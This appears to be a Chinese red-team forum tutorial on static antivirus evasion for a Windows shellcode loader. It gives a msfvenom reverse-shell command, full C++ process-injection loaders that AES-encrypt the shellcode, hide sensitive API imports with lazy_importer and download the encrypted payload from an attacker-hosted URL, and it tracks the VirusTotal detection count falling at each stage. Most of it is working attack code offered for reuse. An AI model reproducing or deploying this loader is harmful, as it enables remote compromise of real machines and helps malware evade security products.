<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [forum.butian.net](https://forum.butian.net/share/1077)

0x00 前言
-------

今天写一篇静态免杀的文章。思路来自于：[https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html](https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html) ，核心是 AES 加密 shellcode + [lazy_importer](https://github.com/JustasMasiulis/lazy_importer) 去符号+shellcode 分离。

> 本人知识有限，如果有错误的地方，请各位大佬指出！

0x01 准备
-------

vs2019 开发

Kali（攻击机）：192.168.94.141

win10（受害机）： 192.168.94.128

今天用到的工具是：[CFF Explorer](https://ntcore.com/?page_id=388)

这里会用到进程注入的知识，如果你之前没有了解过的话，可以去我之前的文章看一下：[https://fengwenhua.top/index.php/archives/65/](https://fengwenhua.top/index.php/archives/65/)

先在 kali 上用 msf 生成 shellcode：

```


1.  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.94.141 LPORT=1234 -f c -b \x00\x0a\x0d`


```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-96480831b5cba1cd8237a1383a9545c39aa58619.png)

然后用 nc 开始监听 1234 端口

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-6cb175a9ba30c82d1ebd883cc0bbe86ba6692ea9.png)

0x02 裸奔
-------

开局直接进程注入，不多bb。

```


1.  `#define _CRT_SECURE_NO_DEPRECATE`
2.  `#include "Windows.h"`
3.  `#include "stdio.h"`

5.  `int main(int argc, char* argv[])`
6.  `{`
7.   `unsigned char buf[] = "msf生成的shellcode";`

9.   `HANDLE processHandle;`
10.   `HANDLE remoteThread;`
11.   `PVOID remoteBuffer;`

13.   `printf("Injecting to PID: %i", atoi(argv[1]));`
14.   `processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));`
15.   `remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);`
16.   `WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL);`
17.   `remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);`
18.   `CloseHandle(processHandle);`

20.   `return 0;`
21.  `}`


```

vs 选择配置和平台，然后生成解决方案

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b496346e205bd313be79b1265cd1ed5d80c0aa2b.png)

比如我们想要注入到 explorer.exe 中，对应的 PID 是 6244，如下：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-77191b264c00263f1d5ec3a99ec3253a56df8bd8.png)

过一会，kali就收到了反弹shell了。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f54cd2e7923d22682e19a0ea6cad88d71fd3bef6.png)

现在我们上传到 VT 上，看看效果怎么样，其实想想就知道，肯定惨不忍睹，毕竟是 msf 生成的 shellcode。。肯定早就被扒光了。。

但我没想到，还有这么多没有检测出来的。。。可能是因为我的程序是x64的？

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-c391e25f0735df127ea99fa4909fe8faeacdbc81.png)

其实整个 shellcode 加载代码里面，无非就两部分检测点，一个是 shellcode，还有一个就是一些敏感函数了。

所以我们可以对这两部分做一下处理，期望能够绕过检测。

0x03 对 shellcode 进行处理
---------------------

### 分析

想验证检测点是不是在 shellcode 处，很简单，把 shellcode 清空，然后重新上传vt

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-7491c86f2fc5c1c02e91b6afc1e4debeba93c93d.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f8b41a5c9cec79e0a59eeea65472ad8d96614400.png)

可以看到，足足少了4个，因此证明 AV 确实会检测 shellcode。所以下面开始用 AES 加密 shellcode ，期望绕过这些检测 shellcode 的 AV。

### AES 加解密

#### tiny-aes（不可用）

> 注意：下面列出的，前面两个库都要自己处理 padding 的问题。。。我是后面才发现的。。不过，不影响整体思路。第三个库我没有测。。

对于 c/c++ 来说，AES加解密的开源库一大堆：

*   [SergeyBel/AES](https://github.com/SergeyBel/AES)
*   [kokke/tiny-AES-c](https://github.com/kokke/tiny-AES-c)
*   [kkAyataka/plusaes](https://github.com/kkAyataka/plusaes)

这里为了方便，直接用 [kokke/tiny-AES-c](https://github.com/kokke/tiny-AES-c) 这个库。打开对应的 Github 仓库，把下图的三个文件下载下来，放到我们的 vs 项目上。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-cb96afd1ddeb5c332b1e197003f3dbfe7eb8aeef.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-42860d0c0e6b3305ca5d51052007780efe2fcb1e.png)

这个库默认使用 AES128 的，我们可以修改`aes.h`，让其使用 AES256

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-e66c03550201556f9b325e4e5d6cbbdc23a1dceb.png)

这个库的用法也很简单。首先把头文件包含进来，`#include "aes.hpp"`，然后加解密方法如下：

```


1.  `#include "aes.hpp"`

3.  `// 提前定义key和iv`
4.  `unsigned char key[] = "16的倍数位的key";`
5.  `unsigned char iv[] = "16位的偏移量";`

7.  `// 声明这个库要求的 aes 结构体`
8.  `struct AES_ctx ctx;`
9.  `// 初始化`
10.  `AES_init_ctx_iv(&ctx, key, iv);`

12.  `// 加密，加密后的结果存放在“加密的内容”处`
13.  `AES_CBC_encrypt_buffer(&ctx, 加密的内容, 加密的内容大小);`

15.  `// 解密，解密后的结果存放在“要解密的内容”处`
16.  `AES_CBC_decrypt_buffer(&ctx, 要解密的内容, 要解密的内容大小);`


```

这里为了方便，直接在相同的项目下操作，但是一个项目不能搞两个 main 方法，所以，先把原先的给排除了，如下：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b2063043b4602b59dd86b8132a3924dfe8675f79.png)

然后直接新建一个`encrypt_shellcode.cpp`，代码如下，得到加密后的shellcode：

```


1.  `#define _CRT_SECURE_NO_DEPRECATE`
2.  `#include "Windows.h"`
3.  `#include "stdio.h"`
4.  `#include "aes.hpp"`

6.  `int main(int argc, char* argv[])`
7.  `{`
8.   `unsigned char buf[] = "msf生成的shellcode";`

10.   `SIZE_T bufSize = sizeof(buf);`

12.   `unsigned char key[] = "fengwenhuafengwenhuafengwenhua.";`
13.   `unsigned char iv[] = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";`

15.   `struct AES_ctx ctx;`
16.   `AES_init_ctx_iv(&ctx, key, iv);`
17.   `AES_CBC_encrypt_buffer(&ctx, buf, bufSize);`

19.   `printf("Encrypted buffer:\n");`

21.   `printf("unsigned char buf[] =\n");`
22.   `int count = 0;`
23.   `for (int i = 0; i < bufSize - 1; i++) {`
24.   `if (count == 0) {`
25.   `printf("\"");`
26.   `}`
27.   `printf("\\x%02x", buf[i]);`
28.   `count++;`
29.   `if (count == 15) {`
30.   `printf("\"\n");`
31.   `count = 0;`
32.   `}`
33.   `}`
34.   `printf("\";\n");`
35.   `system("pause");`
36.   `return 0;`
37.  `}`


```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-867c03dc208fb90ff60e2f5ffacf18fb29720bd9.png)

然后修改原来的cpp，替换原来的shellcode，加入解密方法，如下：

```


1.  `#define _CRT_SECURE_NO_DEPRECATE`
2.  `#include "Windows.h"`
3.  `#include "stdio.h"`
4.  `#include "aes.hpp"`

6.  `int main(int argc, char* argv[])`
7.  `{`
8.   `unsigned char buf[] ="aes解密后的shellcode";`

10.   `HANDLE processHandle;`
11.   `HANDLE remoteThread;`
12.   `PVOID remoteBuffer;`

14.   `// 解密shellcode`
15.   `SIZE_T bufSize = sizeof(buf);`

17.   `unsigned char key[] = "fengwenhuafengwenhuafengwenhua.";`
18.   `unsigned char iv[] = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";`

20.   `struct AES_ctx ctx;`
21.   `AES_init_ctx_iv(&ctx, key, iv);`
22.   `AES_CBC_decrypt_buffer(&ctx, buf, bufSize);`

24.   `printf("Injecting to PID: %i", atoi(argv[1]));`
25.   `processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));`
26.   `remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);`
27.   `WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL);`
28.   `remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);`
29.   `CloseHandle(processHandle);`

31.   `return 0;`
32.  `}`


```

记得`encrypt_shellcode.cpp`从生成中排除，`lazy_importer.cpp`，从生成中排除选“否”

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-97926467b0a4634ea3fc9580fa39f861fee1ab6a.png)

然后重新生成解决方案，kali重新监听 1234，执行如下：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-11ed9ecba67d2cf364995161f04e4e37df4fbdd0.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3b92817f088c93c34eaaf86a1db3e4a78ab46009.png)

ok，成功执行。上传到 vt 看看效果：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-6d46de2865b529c7ba73bcbefc452aae03028627.png)

可以看到，对比裸奔的情况，少了一半检测率。

但后来我发现，并不是每次都能成功，然后我就开始疯狂的排查，最后发现，同样的内容，加密后解密，和之前不一样！！！！然后我开始疯狂的对比加解密后的内容。

后经过一段时间的查找，终于发现，这玩意要自己写 padding。。。因为msf生成的shellcode不一定是16的整数倍，所以就导致加解密的时候出问题了。。。

> [https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html](https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html) 这个作者里面的msf生成的shellcode 刚刚好是16的整数倍，这你敢信？？？

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5e793cf06ba24015cc5060853943e13899738ba0.png)

这个库不行，于是我又尝试了 [SergeyBel/AES](https://github.com/SergeyBel/AES) 这个库。又尝试了半天，还是padding的问题。。。

原地升仙。。。

#### 别人实现的AES

最后，没错，我懒得自己写 padding，于是百度，直接嫖别人的用：[https://blog.csdn.net/witto_sdy/article/details/83375999](https://blog.csdn.net/witto_sdy/article/details/83375999)

按照博客里面的，在 vs 中新建好文件就行

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-a7f9224c497e72227def9daea18cf3f69915b403.png)

在丢到`lazy_importer.cpp`中运行之前，我先新建了一个`encrypt_shellcode.cpp`，在里面对 shellcode 进行 aes 加密

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-d67f1437efc2f263e606e738459ea5fa18620cf9.png)

运行得到结果加密后的 shellcode 之后，然后丢到`lazy_importer.cpp`中解密就行，如下：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3e1f553afa1dedf1381b954085842b677b7a36e8.png)

后面的操作就和上一小节相同，这里不再讲了。

0x04 对敏感函数进行处理
--------------

### 分析

此时，我们用 `CFF Explorer` 打开我们 aes 加密 shellcode 的程序，可以看到 IAT 那里，调用了一堆的敏感函数(`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` and `CloseHandle`)，这些肯定是 AV 必定检查的地方。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-4375cce338f857ee4a37faabf576ba21f0733d39.png)

所以我们的应对办法就是，要么换别的同样效果的函数，要么就想办法把这些调用痕迹清除掉。

### lazy_importer

这里用到的就是开源库 [JustasMasiulis/lazy_importer](https://github.com/JustasMasiulis/lazy_importer) ，同样地，下载下来，导入vs项目

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-1462b7adbb7777c2cd5077b192d230479735b8d2.png)

用法也是超级简单，先 include 进来，然后把`原来函数`改成`LI_FN(原来函数)`就行，修改如下：

> 需要把所有的`NULL`改成`nullptr`

```


1.  `#define _CRT_SECURE_NO_DEPRECATE`
2.  `#include "Windows.h"`
3.  `#include "stdio.h"`
4.  `#include "lazy_importer.hpp"`
5.  `#define BUF_SIZE 4096`

7.  `#include <iostream>`
8.  `#include "AES.h"`
9.  `#include "Base64.h"`

11.  `using namespace std;`

13.  `const char g_key[17] = "asdfwetyhjuytrfd";`
14.  `const char g_iv[17] = "gfdertfghjkuyrtg";//ECB MODE不需要关心chain，可以填空`

16.  `string EncryptionAES(const string& strSrc) //AES加密`
17.  `{`
18.   `size_t length = strSrc.length();`
19.   `int block_num = length / BLOCK_SIZE + 1;`
20.   `//明文`
21.   `char* szDataIn = new char[block_num * BLOCK_SIZE + 1];`
22.   `memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);`
23.   `strcpy(szDataIn, strSrc.c_str());`

25.   `//进行PKCS7Padding填充。`
26.   `int k = length % BLOCK_SIZE;`
27.   `int j = length / BLOCK_SIZE;`
28.   `int padding = BLOCK_SIZE - k;`
29.   `for (int i = 0; i < padding; i++)`
30.   `{`
31.   `szDataIn[j * BLOCK_SIZE + k + i] = padding;`
32.   `}`
33.   `szDataIn[block_num * BLOCK_SIZE] = '\0';`

35.   `//加密后的密文`
36.   `char* szDataOut = new char[block_num * BLOCK_SIZE + 1];`
37.   `memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);`

39.   `//进行进行AES的CBC模式加密`
40.   `AES aes;`
41.   `aes.MakeKey(g_key, g_iv, 16, 16);`
42.   `aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);`
43.   `string str = base64_encode((unsigned char*)szDataOut,`
44.   `block_num * BLOCK_SIZE);`
45.   `delete[] szDataIn;`
46.   `delete[] szDataOut;`
47.   `return str;`
48.  `}`
49.  `string DecryptionAES(const string& strSrc) //AES解密`
50.  `{`
51.   `string strData = base64_decode(strSrc);`
52.   `size_t length = strData.length();`
53.   `//密文`
54.   `char* szDataIn = new char[length + 1];`
55.   `memcpy(szDataIn, strData.c_str(), length + 1);`
56.   `//明文`
57.   `char* szDataOut = new char[length + 1];`
58.   `memcpy(szDataOut, strData.c_str(), length + 1);`

60.   `//进行AES的CBC模式解密`
61.   `AES aes;`
62.   `aes.MakeKey(g_key, g_iv, 16, 16);`
63.   `aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);`

65.   `//去PKCS7Padding填充`
66.   `if (0x00 < szDataOut[length - 1] <= 0x16)`
67.   `{`
68.   `int tmp = szDataOut[length - 1];`
69.   `for (int i = length - 1; i >= length - tmp; i--)`
70.   `{`
71.   `if (szDataOut[i] != tmp)`
72.   `{`
73.   `memset(szDataOut, 0, length);`
74.   `cout << "去填充失败！解密出错！！" << endl;`
75.   `break;`
76.   `}`
77.   `else`
78.   `szDataOut[i] = 0;`
79.   `}`
80.   `}`
81.   `string strDest(szDataOut);`
82.   `delete[] szDataIn;`
83.   `delete[] szDataOut;`
84.   `return strDest;`
85.  `}`

87.  `int main(int argc, char* argv[])`
88.  `{`

90.   `// 加密后的shellcode`
91.   `char buf[BUF_SIZE] = "I8mLz2JN2G9JVrrDFi7LtccqhCU7uccBqZwB4PvkF7N+5iCaKiJR+LYI391ZFJS6ieyEDFLCaEnV6A0zq+P1uyW6HKEEaF4E9FRztJuTLhiukABcgx0z0b9IeGWPLjRS+QywJoEpMZJtJwIDCiF+NRme/Y56ZUZtR2VKf2ZbjndrGmtVlNlWgG1+3noUS+fOqeW+EzflCLQl+ysXmBsaFXunsxpQGiYt2D6nuZ6ZWitp2HnGo/XdpKyOp6EXV5DczC5MOJQWDrog2nATb3uEibBV17OIldHyfTnAENOFMnI0H3L/Rg8oaBKC/Ab0ZVWtlerqfNwxeozb81c6KMfnFsEzxX2Bx1ZYU4LCJfkkAmDfZzDYuko/h7fbuf+9tnjOhsIF3v7Vlf0YVfkb4Spzrg/Ze9BqGU0He9aUpStXvJhTDuQQAOlXxexkK5Ve50T15fGh3VjfairouotBjLPvrRJI7pP821ZAxFJO2mZGwNDJrM8Bhw9+7Ia+bz9V6mMwKmnHwZixT1HKrYnPx68kVWrgWIE3bTUfYYl4RHSerCLT0fBTK+fQg8QEDnMDZJEkR/lbtg7dy4Mxvdo5Bct6dQsg8NymqQRZ2QAM8MgzbxbeozLYKx+s1n5pmxnVY9btuOFWXfWl5+sP49PnExHb8x4SFU0WamL/ChasjDxyQ7jA2u/ezxhFjKW8AsUGxMF5bdXJnY/I5373nCt+Sl2a6q80CFYzZ7IbipLhtBAwUlbURS5hZ/dXcRI8BXsOhcBhglCjCGA0gjO7W7Cp7Icbet+dhYsrhXq+0R0IkrQ6Q5e/gA9AVP60C8aKxLYyeumedE0M9bcg8w6gDwCGsQ9xMzn97sDuqxR0a5a0OT81Veqqp+HQZ9OBiqusDg6eX/mry32sWdgHGemMS9q4F8GX7yd4amxcnfBwJn7n+6E96GBTlF6QzRMfsol5QG0oEF/QvNZGYz3L6ALme8YW6/6U6NznUEFj+Fcg/tivRuX83VDWMP4OW2qydM7kIHY/RXWTDO912FdiBdDbIniVE+q/RQL8UY9W+OqcUm2+P91QSlUGY+CEm14JGbbneMxHoIBMUX9EigHNiHldTzhjA2Vzfsh4DpEU164xK8HrXmnoya0wvAt36MBpidTksvOjzUhLynPkarjK+cYtxxSUpTkQFP+g/Umfx0k7wWp1EIemssWBx51TiOKvZUFxS36q0tddR4CxFIZ1yTYGswyHnj6ffhoGtCpG1/RVy2Hw22Abl0YoeEzG3QM5TyknLGILspCb+zULv/jgGVmK17CBq00dNcHiT1s79l3ek893nzoif4EdBpEqayyczbbuymPfq2Bx";`

93.   `// 解密shellcode`
94.   `string strbuf = DecryptionAES(buf);`
95.   `//cout << "解密后shellcode：" << strbuf << endl;`
96.   `char buff[BUF_SIZE] = { 0 };`
97.   `for (int i = 0; i < strbuf.length(); i++) {`
98.   `buff[i] = strbuf[i];`
99.   `}`

101.   `// shellcode 处理，两个两个一起，还原成 \x00 的样子`
102.   `char* p = buff;`
103.   `unsigned char* shellcode = (unsigned char*)calloc(strlen(buff) / 2, sizeof(unsigned char));`
104.   `for (size_t i = 0; i < strlen(buff) / 2; i++) {`
105.   `sscanf(p, "%2hhx", &shellcode[i]);`
106.   `p += 2;`
107.   `}`

109.   `HANDLE processHandle;`
110.   `HANDLE remoteThread;`
111.   `PVOID remoteBuffer;`

113.   `SIZE_T bufSize = strlen(buff) / 2;`

115.   `//printf("Decrypted buffer:\n");`
116.   `//for (int i = 0; i < bufSize; i++) {`
117.   `//  printf("\\x%02x", shellcode[i]);`
118.   `//}`

120.   `printf("Injecting to PID: %i", atoi(argv[1]));`
121.   `processHandle = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));`

123.   `//processHandle = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(2052));`
124.   `remoteBuffer = LI_FN(VirtualAllocEx)(processHandle, nullptr, bufSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);`
125.   `LI_FN(WriteProcessMemory)(processHandle, remoteBuffer, shellcode, bufSize, nullptr);`
126.   `remoteThread = LI_FN(CreateRemoteThread)(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, nullptr);`
127.   `LI_FN(CloseHandle)(processHandle);`

129.   `return 0;`
130.  `}`


```

可以正常上线：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-970868b65490e42b78a887645dffbf9b983e7ac8.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-1f35f5eb207d632a5ba3d11f4a60ff8737e1062a.png)

再用`CFF Explorer` 看一下，发现已经看不到了。。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-930594c9ca752e3a98925928f412b06de8a1abe9.png)

丢给 vt ，不错，又少了1个

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-00f9cd2aa43d2cd38bdf69ca2ec611333eadfc41.png)

### syscall

除了用 lazy_importer ，还可以看看 syscall，本来想写（shui）一篇 syscall 的文章，但是发现有师傅已经写得很好了： [http://ryze-t.com/posts/2021/12/01/%E6%B5%85%E8%B0%88-Syscall.html](http://ryze-t.com/posts/2021/12/01/%E6%B5%85%E8%B0%88-Syscall.html) ，所以这里就不献丑了。有兴趣的小伙伴可以自己去看看，改改，我这里就不搞了。

0x05 分离shellcode
----------------

在前文中，我们对 shellcode 进行了 AES256 的加密，又使用 lazy_importer 清除了敏感函数调用的痕迹。现在 vt 还有5个报毒，所以这小节，我们再尝试一下 分离 shellcode ，看看能不能再降低 vt 检测率。

这里直接嫖 [https://blog.csdn.net/lgh1700/article/details/7713516](https://blog.csdn.net/lgh1700/article/details/7713516) 中读取网络 url 文件内容的代码，当然，要简单修改一下

```


1.  `#include <tchar.h>`
2.  `#include <wininet.h>`
3.  `#pragma comment(lib, "wininet.lib")`
4.  `#define BUF_SIZE 1024`

6.  `LPSTR GetInterNetURLText(LPSTR lpcInterNetURL,unsigned char* buff);`

8.  `LPSTR GetInterNetURLText(LPSTR lpcInterNetURL,unsigned char* buff)`
9.  `{` 
10.   `HINTERNET hSession;` 
11.   `LPSTR lpResult = NULL;`
12.   `// 这里把 "WinInet" 改成 _T("WinInet")`
13.   `hSession = InternetOpen(_T("WinInet"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);` 
14.   `__try`
15.   `{` 
16.   `if(hSession != NULL)` 
17.   `{` 
18.   `HINTERNET hRequest;` 
19.   `hRequest = InternetOpenUrlA(hSession,lpcInterNetURL, NULL,0, INTERNET_FLAG_RELOAD, 0);` 
20.   `__try` 
21.   `{` 
22.   `if(hRequest != NULL)` 
23.   `{` 
24.   `DWORD dwBytesRead;` 
25.   `char szBuffer[BUF_SIZE] = {0};`

27.   `if(InternetReadFile(hRequest, szBuffer, BUF_SIZE, &dwBytesRead))` 
28.   `{` 
29.   `RtlMoveMemory(buff, szBuffer, BUF_SIZE);` 
30.   `return 0;` 
31.   `}` 
32.   `}` 
33.   `}__finally` 
34.   `{` 
35.   `InternetCloseHandle(hRequest);` 
36.   `}` 
37.   `}` 
38.   `}__finally` 
39.   `{` 
40.   `InternetCloseHandle(hSession);` 
41.   `}` 
42.   `return lpResult;`
43.  `}`


```

调用如下：

```


1.  `//远程获取加密shellcode`
2.  `char buf[BUF_SIZE] = { 0 };`
3.  `char url[MAX_PATH] = "http://192.168.94.141:8000/buf.txt";`
4.  `GetInterNetURLText(url, buf);`


```

kali 机器开启一个web服务，然后运行代码：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5ad16ed4e0bf116e400c1040e777da10df331e8e.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-902ff0964efa4cf660b303cc1b87199f00c2246a.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-2d29fd5c94d54e5d2bdb7c9c6f18fd068ccbc5c1.png)

同理，丢到vt上，不错，又少了两个。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-7940edece82fc4fea492f2478b795ab5483d740b.png)

0x06 后言
-------

其实思路还有很多的，比如我一般用`HeapAlloc`代替`VirtualAlloc`，如果target不是某数字杀软，我还有加vmp壳等等。。由于篇幅原因，以后有机会我们慢慢聊。。

至此，本次分享到此结束。分享中用到的代码，我已经上传 github：[https://github.com/fengwenhua/lazy_importer_aav](https://github.com/fengwenhua/lazy_importer_aav)

**都看到这里了，不管你是直接拉到底的，还是看到底的，要不辛苦一下，给点个推荐呗？**